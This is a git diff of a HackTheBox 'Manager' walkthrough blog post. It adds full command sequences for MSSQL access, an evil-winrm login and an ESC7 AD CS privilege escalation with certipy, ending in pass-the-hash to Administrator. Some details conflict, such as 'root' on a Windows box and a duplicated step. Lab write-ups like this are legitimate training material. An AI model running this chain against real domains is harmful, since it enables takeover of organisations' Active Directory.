@@ -1,13 +1,13 @@
 ---
-title: "HackTheBox:Manager"
+title: "HackTheBox: Manager"
 date: 2025-01-20T09:00:00+02:00
 draft: false
-author: "Anthony Mabi"
+author: "Anthony Tuff"
 cover:
 image: /img/manager.png   ins
 # alt: 'This is an alt tag for You Are Here picture'
 # caption: 'This is a caption for the image. You are not lost.'
-tags: ["hackthebox","windows","hackthebox-walktrough","htb","tech"]
+tags: ["maanger-hackthebox","windows","hackthebox-walktrough","htb","tech"]
 categories: ["hackthebox","windows","boot2root","tech"]
 ---
 
@@ -173,6 +173,8 @@ Based on the results we I go a hit valid username and password, Let's see where 
 ### Exploiting MSSQL
 Since we have an Open MSSQL database, we can begin here and check if we can be able to authenticate with the user identified.I connected using impacket-mssqlclient as shown below:
 
+### Intial FootHold
+
 ```
 impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
 ```
@@ -181,7 +183,7 @@ impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
 
 This allows us to interact with the database, execute queries, and potentially escalate privileges if misconfigurations exist. From here, I proceeded to enumerate available databases and check for any sensitive data that might aid in further exploitation.
 
-Weaponing Command Shell:First things first—before getting fancy, let's go for the easy win. The immediate move is to try enabling xp_cmdshell to execute system commands through SQL. However, I noted we  don't have the necessary privileges to enable it just yet
+***Weaponing Command Shell*** :First things first—before getting fancy, let's go for the easy win. The immediate move is to try enabling xp_cmdshell to execute system commands through SQL. However, I noted we  don't have the necessary privileges to enable it just yet
 
 ![](/img/Pasted%20image%2020250213214108.png)
 
@@ -196,8 +198,8 @@ This means we can read files & folders on the underlying OS & there are some int
 - `SQL2019` (database Server)
 - `Users` (domain users)
 
-Wait....What is xp_dirtree???
-xp_dirtree is an extended stored procedure in Microsoft SQL Server that allows you to list the contents of a directory on the file system. It is part of the xp_cmdshell family of extended stored procedures, which are used to execute operating system commands from within SQL Serv. With it we can be able to retrieve a list of files and subdirectories within a specified directory. 
+Wait….
+*What is xp_dirtree???* : xp_dirtree is an extended stored procedure in Microsoft SQL Server that allows you to list the contents of a directory on the file system. It is part of the xp_cmdshell family of extended stored procedures, which are used to execute operating system commands from within SQL Serv. With it we can be able to retrieve a list of files and subdirectories within a specified directory
 
 Exploring directories and files on the server as shown below;
 
@@ -212,49 +214,92 @@ Upon poking around the web root of the website-backup file there was an old-conf
 ![](/img/Pasted%20image%2020250213220715.png)
 
 
-We can use this credentials to aattempt to login to the server through evil-winrm as indicated below;, Poked around, and guess what? The user flag was just chilling on the desktop. Easy win. Let’s keep this party going. 🚀💻 #Pwned
+We can use this credentials to attempt to login to the server through evil-winrm as indicated below;, Poked around, and guess what? The user flag was just chilling on the desktop. Easy win. Let’s keep this party going. 🚀💻 #Pwned
+```python
+evil-winrm  -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'   `
+```
 
 ![](/img/Pasted%20image%2020250213221643.png)
 
 
 
-```python
-evil-winrm  -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'   `
-```
+## Privilege Escalation
+For privilege escalation, I initially attempted to run the WinPEAS binary; however, it did not yield any substantial findings. Next, I examined the machine’s name to determine whether it provided any hints regarding potential escalation vectors. I then fired up **BloodHound**, fed it the creds I snagged, and exported the results to map out possible escalation routes. After some deep OSINT and testing various approaches, I figured out the box was vulnerable to an **ADCS attack vector**, opening up a solid path to escalate.
 
-
-
-
+###### Using Certipy to find vulnerabilities
 ```
 certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
 ```
 ![](/img/Pasted%20image%2020250105220502.png)
 
+Based on the results from **Certipy**, we can see the  user **Raven** holds dangerous permissions, specifically **ManageCA** rights over the Certification Authority. This opens the door for an **ESC7** attack, allowing us to escalate privileges and pivot to **Domain Admin** while operating under Raven’s account
+
+> ESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests
+
+##### Exploitation Steps
+To exploit this, we'll need to first add Raven as an "officer", so that we can manage certificates and
+issue them manually.
+###### Step 1: Add Raven as an Officer, to manage & issue certs:
+```bash
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven -debug
+```
+![](/img/Pasted%20image%2020250216002936.png)
+
+###### Step 2 Enable `SubCA` template:
+The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.
 ```
 certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
-
-
-certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
-10.10.11.236 -ca manager-dc01-ca -list-templates
 ```
-![](/img/Pasted%20image%2020250106200058.png)
+![[Pasted image 20250106200058.png]]
 
-![](/img/Pasted%20image%2020250106195957.png)
-```
-certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
-10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
+Verify the template has been enabled
 
-certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
-10.10.11.236 -ca manager-dc01-ca -issue-request 1
+![[/img/Pasted image 20250106195957.png]]
+###### Step 3 Request a certificate on behalf of the administrator:
 ```
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
+```
+![](/img/Pasted%20image%2020250216003600.png)
+###### Step 4 Re-issue our failed cert:
+```
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 27
+```
+![](/img/Pasted%20image%2020250216004907.png)
+###### Step 5 Retrieve the issued cert and download as `.pfx`:
+```
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 27
+
+```
+![](/img/Pasted%20image%2020250216005318.png)
+###### Step 5 Retrieve the issued cert and download as `.pfx`:
+```
+certipy-ad auth -pfx administrator.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+[*] Using principal: administrator@manager.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@manager.htb':
+aad3b435b51404eeaadsasada3b435b51404eesdsaa:ae5064c2f62317332c88629e025924ef
+```
+Based on the results above, we have successfully pulled the NTLM hash for the Administrator user. This means we can leverage a Pass-the-Hash (PTH) attack to authenticate as Administrator without needing the plaintext password.
+
+
+## Ownership:
+We can now login as the admin using their hash obtained, through pass the hash:
+![](/img/Pasted%20image%2020250216010137.png)
+
 
 ## 📜 Conclusion 
-- This walkthrough demonstrates the process of exploiting **Git leaks**, **CMS vulnerabilities**, and **🔓 sudo configurations**.
+- This walkthrough demonstrates the process of exploiting **RID Cycling Attack** **AD CS Attacks**, **Abuse  MSSQL**, and **🔓 ESC7 exploitation**.
 - Key takeaways include:
-    1. **⬆️ Update 👻CMS** to the latest version to fix CVE-2023-40028.
-    2. Remove sensitive 📂 from production deployments.
+    1. Enumerating users using RID cycling
+    2. Escalating privileges through AD CS via ESC7 Misconfiguration
     3. Avoid 🛠️ with elevated privileges unless absolutely necessary.
 By chaining 🛠️ misconfigurations and outdated 📂, I successfully escalated privileges to *root**.
 
-References:
-https://bloodstiller.com/walkthroughs/manager-box/
+###### References & Suggested Reading:
+https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
+https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547
+https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac
